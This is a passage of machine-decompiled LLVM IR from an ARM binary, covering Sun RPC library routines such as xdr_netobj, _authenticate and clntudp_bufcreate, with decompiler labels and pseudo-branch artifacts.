  %v2_31ce8 = call i32 @__GI_fputs(i32 %v2_31ce0, i32 %v2_31ce4)
  %v0_31cec = load i32, i32* @r4, align 4
  store i32 %v0_31cec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31d38

dec_label_pc_31cf4:                               ; preds = %dec_label_pc_31c9c, %dec_label_pc_31cbc.dec_label_pc_31cf4_crit_edge, %dec_label_pc_31cb4
  %v0_31cfc = phi i32 [ %v0_31cfc.pre, %dec_label_pc_31cbc.dec_label_pc_31cf4_crit_edge ], [ %v2_31c78, %dec_label_pc_31cb4 ], [ %v2_31c78, %dec_label_pc_31c9c ]
  %v0_31cf4 = phi i32 [ %v0_31cf4.pre, %dec_label_pc_31cbc.dec_label_pc_31cf4_crit_edge ], [ %v0_31c90.pre, %dec_label_pc_31cb4 ], [ %v0_31c90.pre, %dec_label_pc_31c9c ]
  store i32 %v0_31cf4, i32* %r0.global-to-local, align 4
  %v0_31cf8 = load i32, i32* @r4, align 4
  store i32 %v3_31c44, i32* @r4, align 4
  store i32 %v6_31c44, i32* @r5, align 4
  store i32 %v9_31c44, i32* @r6, align 4
  store i32 %v12_31c44, i32* @r7, align 4
  store i32 %v15_31c44, i32* @r8, align 4
  store i32 %v21_31c44, i32* @lr, align 4
  %v3_31d08 = inttoptr i32 %v0_31cf4 to i32*
  %v4_31d08 = call i32 @xdr_opaque(i32* %v3_31d08, i32 %v0_31cf8, i32 %v0_31cfc)
  store i32 %v4_31d08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31d0c

dec_label_pc_31d0c:                               ; preds = %dec_label_pc_31ca0, %dec_label_pc_31cf4
  %v0_31d0c = load i32, i32* @r4, align 4
  %v2_31d0c = icmp eq i32 %v0_31d0c, 0
  br i1 %v2_31d0c, label %dec_label_pc_31d34, label %dec_label_pc_31d14

dec_label_pc_31d14:                               ; preds = %dec_label_pc_31d0c
  store i32 %v0_31d0c, i32* @r0, align 4
  %v0_31d18 = call i32 @free()
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_31d24 = load i32, i32* @r8, align 4
  %v2_31d24 = inttoptr i32 %v1_31d24 to i32*
  store i32 0, i32* %v2_31d24, align 4
  %v1_31d40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31d38

dec_label_pc_31d2c:                               ; preds = %dec_label_pc_31ca0, %dec_label_pc_31c84, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31d38

dec_label_pc_31d34:                               ; preds = %dec_label_pc_31d0c, %dec_label_pc_31cac
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31d38

dec_label_pc_31d38:                               ; preds = %dec_label_pc_31d2c, %dec_label_pc_31d14, %dec_label_pc_31cd4, %dec_label_pc_31d34
  %v1_31d40 = phi i32 [ 0, %dec_label_pc_31d2c ], [ %v1_31d40.pre, %dec_label_pc_31d14 ], [ %v0_31cec, %dec_label_pc_31cd4 ], [ 1, %dec_label_pc_31d34 ]
  ret i32 %v1_31d40

; uselistorder directives
  uselistorder i32 %v0_31cf4, { 1, 0 }
  uselistorder i32 %v1_31cc0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_31c90, { 0, 2, 1 }
  uselistorder i32 %v0_31c90.pre, { 2, 1, 0 }
  uselistorder i32 %v2_31c78, { 1, 2, 4, 3, 5, 0, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 11, 4, 7, 5, 6, 9, 8, 10 }
  uselistorder label %dec_label_pc_31d38, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_31d0c, { 1, 0 }
  uselistorder label %dec_label_pc_31cf4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_31c90, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  store i32 1024, i32* @r3, align 4
  %v1_31d58 = add i32 %arg1, 4
  store i32 %v1_31d58, i32* @r1, align 4
  %v0_31d5c = call i32 @xdr_bytes()
  ret i32 %v0_31d5c
}

define i32 @_authenticate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_31d60 = load i32, i32* @r4, align 4
  store i32 %v3_31d60, i32* %stack_var_-12, align 4
  %v1_31d64 = add i32 %arg2, 24
  store i32 %arg1, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_31d70 = inttoptr i32 %v1_31d64 to i32*
  %v2_31d70 = load i32, i32* %v1_31d70, align 4
  store i32 %v2_31d70, i32* %r0.global-to-local, align 4
  %v3_31d70 = add i32 %arg2, 28
  %v4_31d70 = inttoptr i32 %v3_31d70 to i32*
  %v5_31d70 = load i32, i32* %v4_31d70, align 4
  store i32 %v5_31d70, i32* %r1.global-to-local, align 4
  %v6_31d70 = add i32 %arg2, 32
  %v7_31d70 = inttoptr i32 %v6_31d70 to i32*
  %v8_31d70 = load i32, i32* %v7_31d70, align 4
  store i32 %v8_31d70, i32* %r2.global-to-local, align 4
  %v1_31d78 = add i32 %arg1, 12
  %v1_31d7c = inttoptr i32 %v1_31d78 to i32*
  store i32 %v2_31d70, i32* %v1_31d7c, align 4
  %v3_31d7c = add i32 %arg1, 16
  %v4_31d7c = inttoptr i32 %v3_31d7c to i32*
  %v5_31d7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_31d7c, i32* %v4_31d7c, align 4
  %v6_31d7c = add i32 %arg1, 20
  %v7_31d7c = inttoptr i32 %v6_31d7c to i32*
  %v8_31d7c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_31d7c, i32* %v7_31d7c, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %lr.global-to-local, align 4
  %v4_31d88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 240) to i32*), align 4
  %v1_31d8c = inttoptr i32 %v4_31d88 to i32*
  %v2_31d8c = load i32, i32* %v1_31d8c, align 4
  store i32 %v2_31d8c, i32* %r2.global-to-local, align 4
  %v0_31d90 = load i32, i32* %ip.global-to-local, align 4
  %v1_31d90 = add i32 %v0_31d90, 28
  %v2_31d90 = inttoptr i32 %v1_31d90 to i32*
  %v3_31d90 = load i32, i32* %v2_31d90, align 4
  %v2_31d94 = add i32 %v3_31d90, 32
  %v3_31d94 = inttoptr i32 %v2_31d94 to i32*
  store i32 %v2_31d8c, i32* %v3_31d94, align 4
  %v0_31d98 = load i32, i32* %ip.global-to-local, align 4
  %v1_31d98 = add i32 %v0_31d98, 12
  %v2_31d98 = inttoptr i32 %v1_31d98 to i32*
  %v3_31d98 = load i32, i32* %v2_31d98, align 4
  store i32 %v3_31d98, i32* %r4.global-to-local, align 4
  %v1_31d9c = add i32 %v0_31d98, 28
  %v2_31d9c = inttoptr i32 %v1_31d9c to i32*
  %v3_31d9c = load i32, i32* %v2_31d9c, align 4
  store i32 %v3_31d9c, i32* %r2.global-to-local, align 4
  %v2_31da0 = icmp ugt i32 %v3_31d98, 2
  %v7_31da0 = icmp eq i32 %v3_31d98, 3
  %v2_31dac = add i32 %v3_31d9c, 40
  %v3_31dac = inttoptr i32 %v2_31dac to i32*
  store i32 0, i32* %v3_31dac, align 4
  %v2_31db0 = xor i1 %v7_31da0, true
  %v3_31db0 = and i1 %v2_31da0, %v2_31db0
  br i1 %v3_31db0, label %bb, label %bb10

bb:                                               ; preds = %entry
  store i32 2, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %entry, %bb
  %v2_31db4 = xor i1 %v2_31da0, true
  %v3_31db4 = or i1 %v7_31da0, %v2_31db4
  br i1 %v3_31db4, label %bb11, label %.thread5

bb11:                                             ; preds = %bb10
  %v4_31db8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v4_31db8, i32* %r0.global-to-local, align 4
  %v4_31dbc = load i32, i32* %lr.global-to-local, align 4
  %v6_31dbc = add i32 %v4_31dbc, -36
  %v4_31dc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_31dc0, i32* %r1.global-to-local, align 4
  %v5_31dc4 = load i32, i32* %r4.global-to-local, align 4
  %v6_31dc4 = and i32 %v5_31dc4, 1073741824
  %v7_31dc4 = icmp ne i32 %v6_31dc4, 0
  %v8_31dc4 = mul i32 %v5_31dc4, 4
  %v9_31dc4 = add i32 %v8_31dc4, %v6_31dbc
  %v10_31dc4 = inttoptr i32 %v9_31dc4 to i32*
  %v11_31dc4 = load i32, i32* %v10_31dc4, align 4
  store i32 %v11_31dc4, i32* %ip.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb10, %bb11
  %v2_31dcc = phi i1 [ %v7_31dc4, %bb11 ], [ %v2_31da0, %bb10 ]
  %v2_31dc8 = xor i1 %v2_31dcc, true
  %v3_31dc8 = or i1 %v7_31da0, %v2_31dc8
  br i1 %v3_31dc8, label %bb12, label %bb13

bb12:                                             ; preds = %.thread5
  store i32 204240, i32* %lr.global-to-local, align 4
  br label %bb13

bb13:                                             ; preds = %.thread5, %bb12
  %v0_31dcc = load i32, i32* %ip.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v3_31dc8, i32 %v0_31dcc)
  %v2_31dd4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_31dd4, i32* @r4, align 4
  %v1_31dd8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_31dd8

; uselistorder directives
  uselistorder i1 %v7_31da0, { 1, 2, 0 }
  uselistorder i1 %v2_31da0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 -36, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder i32 %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @clntudp_geterr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_31df0 = add i32 %arg1, 8
  %v2_31df0 = inttoptr i32 %v1_31df0 to i32*
  %v3_31df0 = load i32, i32* %v2_31df0, align 4
  %v1_31df4 = add i32 %v3_31df0, 44
  %v1_31dfc = inttoptr i32 %v1_31df4 to i32*
  %v2_31dfc = load i32, i32* %v1_31dfc, align 4
  %v3_31dfc = add i32 %v3_31df0, 48
  %v4_31dfc = inttoptr i32 %v3_31dfc to i32*
  %v5_31dfc = load i32, i32* %v4_31dfc, align 4
  store i32 %v5_31dfc, i32* %r1.global-to-local, align 4
  %v6_31dfc = add i32 %v3_31df0, 52
  %v7_31dfc = inttoptr i32 %v6_31dfc to i32*
  %v8_31dfc = load i32, i32* %v7_31dfc, align 4
  store i32 %v8_31dfc, i32* %r2.global-to-local, align 4
  store i32 %v2_31dfc, i32* %arg2, align 4
  %v3_31e00 = add i32 %tmp, 4
  %v4_31e00 = inttoptr i32 %v3_31e00 to i32*
  %v5_31e00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_31e00, i32* %v4_31e00, align 4
  %v6_31e00 = add i32 %tmp, 8
  %v7_31e00 = inttoptr i32 %v6_31e00 to i32*
  %v8_31e00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_31e00, i32* %v7_31e00, align 4
  ret i32 %v2_31dfc

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_31e0c = add i32 %arg1, 8
  %v2_31e0c = inttoptr i32 %v1_31e0c to i32*
  %v3_31e0c = load i32, i32* %v2_31e0c, align 4
  store i32 %v3_31e0c, i32* %r0.global-to-local, align 4
  %v2_31e18 = add i32 %v3_31e0c, 56
  %v3_31e18 = inttoptr i32 %v2_31e18 to i32*
  store i32 2, i32* %v3_31e18, align 4
  %v4_31e18 = load i32, i32* %r0.global-to-local, align 4
  %v5_31e18 = add i32 %v4_31e18, 56
  store i32 %v5_31e18, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg2)
  ret i32 %v5_31e18

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v1_31e38 = load i32, i32* @r0, align 4
  ret i32 %v1_31e38
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_31e40 = add i32 %arg2, -1
  %tmp = icmp ult i32 %v1_31e40, 15
  br i1 %tmp, label %bb, label %dec_label_pc_31e94

bb:                                               ; preds = %entry
  %v7_31e50 = mul i32 %v1_31e40, 4
  %v8_31e50 = add i32 %v7_31e50, ptrtoint (i32* @global_var_31e58.2148 to i32)
  call void @__pseudo_branch(i32 %v8_31e50)
  br label %dec_label_pc_31e94

dec_label_pc_31e94:                               ; preds = %bb, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_31e40, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v3_31fe8 = load i32, i32* @r4, align 4
  %v6_31fe8 = load i32, i32* @r5, align 4
  %v9_31fe8 = load i32, i32* @r6, align 4
  %v12_31fe8 = load i32, i32* @r7, align 4
  %v15_31fe8 = load i32, i32* @r8, align 4
  %v18_31fe8 = load i32, i32* @sb, align 4
  %v21_31fe8 = load i32, i32* @sl, align 4
  %v24_31fe8 = load i32, i32* @fp, align 4
  %v27_31fe8 = load i32, i32* @lr, align 4
  %v0_31ff4 = load i32, i32* @r3, align 4
  store i32 %tmp26, i32* %r3.global-to-local, align 4
  %v0_31ffc = load i32, i32* @r0, align 4
  store i32 %v0_31ffc, i32* @r4, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v0_32004 = load i32, i32* @r1, align 4
  %v0_32008 = load i32, i32* @r2, align 4
  %v1_32014 = call i32 @malloc(i32 12)
  %v1_3201c = add i32 %tmp11, 3
  %v1_32020 = and i32 %v1_3201c, -4
  store i32 %v1_32020, i32* @sb, align 4
  %v1_32028 = add i32 %tmp10, 3
  store i32 %v1_32028, i32* %r3.global-to-local, align 4
  store i32 %v1_32014, i32* @r6, align 4
  %v1_32030 = and i32 %v1_32028, -4
  store i32 %v1_32030, i32* @r8, align 4
  %v1_32034 = add i32 %v1_32030, 100
  %v2_32038 = add i32 %v1_32034, %v1_32020
  store i32 %v2_32038, i32* %r0.global-to-local, align 4
  %v1_3203c = call i32 @malloc(i32 %v2_32038)
  store i32 %v1_3203c, i32* %r0.global-to-local, align 4
  %v2_32044 = icmp eq i32 %v1_3203c, 0
  br i1 %v2_32044, label %.thread3, label %bb

bb:                                               ; preds = %entry
  %v1_32048 = load i32, i32* @r6, align 4
  %v3_32048 = icmp eq i32 %v1_32048, 0
  store i32 %v1_3203c, i32* @r5, align 4
  br i1 %v3_32048, label %dec_label_pc_32060, label %dec_label_pc_32090

.thread3:                                         ; preds = %entry
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_32060

dec_label_pc_32060:                               ; preds = %bb, %.thread3
  store i32 1, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  %v0_32060 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_32060, i32* %r0.global-to-local, align 4
  store i32 196, i32* %r3.global-to-local, align 4
  store i32 %v0_32060, i32* @r4, align 4
  %v0_3206c = load i32, i32* @r7, align 4
  %v2_3206c = add i32 %v0_3206c, 196
  %v3_3206c = inttoptr i32 %v2_3206c to i32*
  %v4_3206c = load i32, i32* %v3_3206c, align 4
  store i32 %v4_3206c, i32* %r3.global-to-local, align 4
  store i32 -34128, i32* %r0.global-to-local, align 4
  %v1_32074 = inttoptr i32 %v4_3206c to i32*
  %v2_32074 = load i32, i32* %v1_32074, align 4
  %v2_32078 = add i32 %v0_3206c, -34128
  store i32 %v2_32078, i32* %r0.global-to-local, align 4
  %v2_3207c = call i32 @__GI_fputs(i32 %v2_32078, i32 %v2_32074)
  store i32 %v2_3207c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v1_32084 = load i32, i32* @r4, align 4
  %v2_32084 = add i32 %v1_32084, 8
  %v3_32084 = inttoptr i32 %v2_32084 to i32*
  store i32 12, i32* %v3_32084, align 4
  %v0_32088 = load i32, i32* %r3.global-to-local, align 4
  %v1_32088 = load i32, i32* @r4, align 4
  %v2_32088 = inttoptr i32 %v1_32088 to i32*
  store i32 %v0_32088, i32* %v2_32088, align 4
  br label %dec_label_pc_32228

dec_label_pc_32090:                               ; preds = %bb
  store i32 0, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  %v1_32090 = add i32 %v1_3203c, 96
  %v1_32094 = load i32, i32* @r8, align 4
  %v2_32094 = add i32 %v1_32090, %v1_32094
  store i32 %v2_32094, i32* %r3.global-to-local, align 4
  %v2_32098 = add i32 %v1_3203c, 88
  %v3_32098 = inttoptr i32 %v2_32098 to i32*
  store i32 %v2_32094, i32* %v3_32098, align 4
  %v0_3209c = load i32, i32* @r4, align 4
  %v1_3209c = add i32 %v0_3209c, 2
  %v2_3209c = inttoptr i32 %v1_3209c to i16*
  %v3_3209c = load i16, i16* %v2_3209c, align 2
  %v4_3209c = zext i16 %v3_3209c to i32
  store i32 %v4_3209c, i32* %r3.global-to-local, align 4
  %v2_320a0 = icmp eq i16 %v3_3209c, 0
  br i1 %v2_320a0, label %dec_label_pc_320a8, label %dec_label_pc_320d8

dec_label_pc_320a8:                               ; preds = %dec_label_pc_32090
  store i32 %v0_3209c, i32* %r0.global-to-local, align 4
  %v1_320b4 = add nuw nsw i32 %v4_3209c, 17
  store i32 %v1_320b4, i32* %r3.global-to-local, align 4
  %v4_320b8 = call i32 @pmap_getport(i32 %v0_3209c, i32 %v0_32004, i32 %v0_32008, i32 %v1_320b4)
  store i32 %v4_320b8, i32* %r0.global-to-local, align 4
  %v2_320bc = icmp eq i32 %v4_320b8, 0
  br i1 %v2_320bc, label %dec_label_pc_32228, label %dec_label_pc_320c4

dec_label_pc_320c4:                               ; preds = %dec_label_pc_320a8
  %v3_320c4 = udiv i32 %v4_320b8, 256
  %v1_320c8 = urem i32 %v3_320c4, 256
  %v1_320cc = urem i32 %v4_320b8, 256
  %v4_320d0 = mul nuw nsw i32 %v1_320cc, 256
  %v5_320d0 = or i32 %v4_320d0, %v1_320c8
  store i32 %v5_320d0, i32* %r3.global-to-local, align 4
  %v1_320d4 = trunc i32 %v5_320d0 to i16
  %v2_320d4 = load i32, i32* @r4, align 4
  %v3_320d4 = add i32 %v2_320d4, 2
  %v4_320d4 = inttoptr i32 %v3_320d4 to i16*
  store i16 %v1_320d4, i16* %v4_320d4, align 2
  br label %dec_label_pc_320d8

dec_label_pc_320d8:                               ; preds = %dec_label_pc_32090, %dec_label_pc_320c4
  %v0_320dc = load i32, i32* @r7, align 4
  %v2_320dc = add i32 %v0_320dc, -120
  store i32 %v2_320dc, i32* %r3.global-to-local, align 4
  %v0_320e0 = load i32, i32* @r6, align 4
  %v1_320e0 = add i32 %v0_320e0, 4
  %v2_320e0 = inttoptr i32 %v1_320e0 to i32*
  store i32 %v2_320dc, i32* %v2_320e0, align 4
  %v4_320e0 = add i32 %v0_320e0, 8
  %v5_320e0 = inttoptr i32 %v4_320e0 to i32*
  %v6_320e0 = load i32, i32* @r5, align 4
  store i32 %v6_320e0, i32* %v5_320e0, align 4
  %v0_320e4 = load i32, i32* @r4, align 4
  %v1_320e4 = inttoptr i32 %v0_320e4 to i32*
  %v2_320e4 = load i32, i32* %v1_320e4, align 4
  store i32 %v2_320e4, i32* %r0.global-to-local, align 4
  %v3_320e4 = add i32 %v0_320e4, 4
  %v4_320e4 = inttoptr i32 %v3_320e4 to i32*
  %v5_320e4 = load i32, i32* %v4_320e4, align 4
  %v6_320e4 = add i32 %v0_320e4, 8
  %v7_320e4 = inttoptr i32 %v6_320e4 to i32*
  %v8_320e4 = load i32, i32* %v7_320e4, align 4
  %v9_320e4 = add i32 %v0_320e4, 12
  %v10_320e4 = inttoptr i32 %v9_320e4 to i32*
  %v11_320e4 = load i32, i32* %v10_320e4, align 4
  store i32 %v11_320e4, i32* %r3.global-to-local, align 4
  %v0_320e8 = load i32, i32* @r5, align 4
  %v1_320e8 = add i32 %v0_320e8, 8
  %v1_320ec = inttoptr i32 %v1_320e8 to i32*
  store i32 %v2_320e4, i32* %v1_320ec, align 4
  %v3_320ec = add i32 %v0_320e8, 12
  %v4_320ec = inttoptr i32 %v3_320ec to i32*
  store i32 %v5_320e4, i32* %v4_320ec, align 4
  %v6_320ec = add i32 %v0_320e8, 16
  %v7_320ec = inttoptr i32 %v6_320ec to i32*
  store i32 %v8_320e4, i32* %v7_320ec, align 4
  %v9_320ec = add i32 %v0_320e8, 20
  %v10_320ec = inttoptr i32 %v9_320ec to i32*
  %v11_320ec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_320ec, i32* %v10_320ec, align 4
  %v1_320f4 = load i32, i32* @r5, align 4
  %v2_320f4 = add i32 %v1_320f4, 24
  %v3_320f4 = inttoptr i32 %v2_320f4 to i32*
  store i32 16, i32* %v3_320f4, align 4
  %v1_320fc = load i32, i32* @r5, align 4
  %v2_320fc = add i32 %v1_320fc, 32
  %v3_320fc = inttoptr i32 %v2_320fc to i32*
  store i32 %tmp26, i32* %v3_320fc, align 4
  store i32 %v0_31ff4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  %v1_32108 = load i32, i32* @r5, align 4
  %v2_32108 = add i32 %v1_32108, 40
  %v3_32108 = inttoptr i32 %v2_32108 to i32*
  store i32 -1, i32* %v3_32108, align 4
  %v0_3210c = load i32, i32* @lr, align 4
  %v1_3210c = load i32, i32* @r5, align 4
  %v2_3210c = add i32 %v1_3210c, 36
  %v3_3210c = inttoptr i32 %v2_3210c to i32*
  store i32 %v0_3210c, i32* %v3_3210c, align 4
  %v1_32110 = load i32, i32* @r5, align 4
  %v2_32110 = add i32 %v1_32110, 28
  %v3_32110 = inttoptr i32 %v2_32110 to i32*
  store i32 %v0_31ff4, i32* %v3_32110, align 4
  %v0_32114 = load i32, i32* @r8, align 4
  %v1_32114 = load i32, i32* @r5, align 4
  %v2_32114 = add i32 %v1_32114, 92
  %v3_32114 = inttoptr i32 %v2_32114 to i32*
  store i32 %v0_32114, i32* %v3_32114, align 4
  %v0_32118 = load i32, i32* @sb, align 4
  %v1_32118 = load i32, i32* @r5, align 4
  %v2_32118 = add i32 %v1_32118, 84
  %v3_32118 = inttoptr i32 %v2_32118 to i32*
  store i32 %v0_32118, i32* %v3_32118, align 4
  %v4_3211c = call i32 @_create_xid(i32 %v2_320e4, i32 %v5_320e4, i32 %v8_320e4, i32 %v0_31ff4)
  store i32 %v4_3211c, i32* %r0.global-to-local, align 4
  store i32 %v0_32008, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r7, align 4
  store i32 %v4_3211c, i32* %stack_var_-104, align 4
  %v0_32138 = load i32, i32* @sl, align 4
  %v0_32140 = load i32, i32* @r5, align 4
  %v1_32140 = add i32 %v0_32140, 56
  store i32 %v1_32140, i32* @r4, align 4
  %v0_32144 = load i32, i32* @sb, align 4
  %v1_32148 = add i32 %v0_32140, 88
  %v2_32148 = inttoptr i32 %v1_32148 to i32*
  %v3_32148 = load i32, i32* %v2_32148, align 4
  store i32 %v0_32138, i32* %r3.global-to-local, align 4
  store i32 %v1_32140, i32* %r0.global-to-local, align 4
  %v9_32154 = inttoptr i32 %v1_32140 to i32*
  %v10_32154 = call i32 @__GI_xdrmem_create(i32* %v9_32154, i32 %v3_32148, i32 %v0_32144, i32 %v0_32138, i32 %v4_3211c, i32 %v0_32138, i32 2, i32 %v0_32004, i32 %v0_32008)
  %v0_32158 = load i32, i32* @r4, align 4
  store i32 %v0_32158, i32* %r0.global-to-local, align 4
  %v2_3215c = ptrtoint i32* %stack_var_-104 to i32
  %v2_32160 = inttoptr i32 %v0_32158 to i32*
  %v3_32160 = call i32 @__GI_xdr_callhdr(i32* %v2_32160, i32 %v2_3215c)
  store i32 %v3_32160, i32* %r0.global-to-local, align 4
  %v2_32164 = icmp eq i32 %v3_32160, 0
  br i1 %v2_32164, label %dec_label_pc_32228, label %dec_label_pc_3216c

dec_label_pc_3216c:                               ; preds = %dec_label_pc_320d8
  %v0_3216c = load i32, i32* @r5, align 4
  %v1_3216c = add i32 %v0_3216c, 60
  %v2_3216c = inttoptr i32 %v1_3216c to i32*
  %v3_3216c = load i32, i32* %v2_3216c, align 4
  store i32 %v3_3216c, i32* %r3.global-to-local, align 4
  %v0_32170 = load i32, i32* @r4, align 4
  store i32 %v0_32170, i32* %r0.global-to-local, align 4
  %v1_32174 = add i32 %v3_3216c, 16
  %v2_32174 = inttoptr i32 %v1_32174 to i32*
  %v3_32174 = load i32, i32* %v2_32174, align 4
  store i32 ptrtoint (i32* @global_var_32180.2153 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_32174)
  %v0_32180 = load i32, i32* %r0.global-to-local, align 4
  %v1_32180 = load i32, i32* @r5, align 4
  %v2_32180 = add i32 %v1_32180, 80
  %v3_32180 = inttoptr i32 %v2_32180 to i32*
  store i32 %v0_32180, i32* %v3_32180, align 4
  %v0_32184 = load i32, i32* @fp, align 4
  %v1_32184 = inttoptr i32 %v0_32184 to i32*
  %v2_32184 = load i32, i32* %v1_32184, align 4
  store i32 %v2_32184, i32* %r3.global-to-local, align 4
  %v1_32188 = icmp slt i32 %v2_32184, 0
  br i1 %v1_32188, label %dec_label_pc_32194, label %bb34

bb34:                                             ; preds = %dec_label_pc_3216c
  %v3_3218c = load i32, i32* @sl, align 4
  %v4_3218c = load i32, i32* @r5, align 4
  %v5_3218c = add i32 %v4_3218c, 4
  %v6_3218c = inttoptr i32 %v5_3218c to i32*
  store i32 %v3_3218c, i32* %v6_3218c, align 4
  br label %dec_label_pc_32214

dec_label_pc_32194:                               ; preds = %dec_label_pc_3216c
  %v0_32194 = load i32, i32* @r7, align 4
  store i32 %v0_32194, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v3_321a8 = call i32 @socket(i32 %v0_32194, i32 %v0_32194, i32 17)
  store i32 %v3_321a8, i32* %r0.global-to-local, align 4
  %v1_321ac = icmp slt i32 %v3_321a8, 0
  %v1_321b0 = load i32, i32* @fp, align 4
  %v2_321b0 = inttoptr i32 %v1_321b0 to i32*
  store i32 %v3_321a8, i32* %v2_321b0, align 4
  br i1 %v1_321ac, label %dec_label_pc_321b8, label %dec_label_pc_321d8

dec_label_pc_321b8:                               ; preds = %dec_label_pc_32194
  %v0_321b8 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_321b8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_321c0 = inttoptr i32 %v0_321b8 to i32*
  store i32 12, i32* %v2_321c0, align 4
  store i32 %v0_321b8, i32* @r4, align 4
  %v0_321c8 = call i32 @__GI___errno_location()
  store i32 %v0_321c8, i32* %r0.global-to-local, align 4
  %v1_321cc = inttoptr i32 %v0_321c8 to i32*
  %v2_321cc = load i32, i32* %v1_321cc, align 4
  store i32 %v2_321cc, i32* %r3.global-to-local, align 4
  %v1_321d0 = load i32, i32* @r4, align 4
  %v2_321d0 = add i32 %v1_321d0, 8
  %v3_321d0 = inttoptr i32 %v2_321d0 to i32*
  store i32 %v2_321cc, i32* %v3_321d0, align 4
  br label %dec_label_pc_32228

dec_label_pc_321d8:                               ; preds = %dec_label_pc_32194
  %v0_321d8 = load i32, i32* @sl, align 4
  %v2_321dc = inttoptr i32 %v0_321d8 to i16*
  %v3_321dc = call i32 @__GI_bindresvport(i32 %v3_321a8, i16* %v2_321dc)
  store i32 %v3_321dc, i32* %r0.global-to-local, align 4
  %v2_321e4 = ptrtoint i32* %stack_var_-52 to i32
  %v0_321e8 = load i32, i32* @fp, align 4
  %v1_321e8 = inttoptr i32 %v0_321e8 to i32*
  %v2_321e8 = load i32, i32* %v1_321e8, align 4
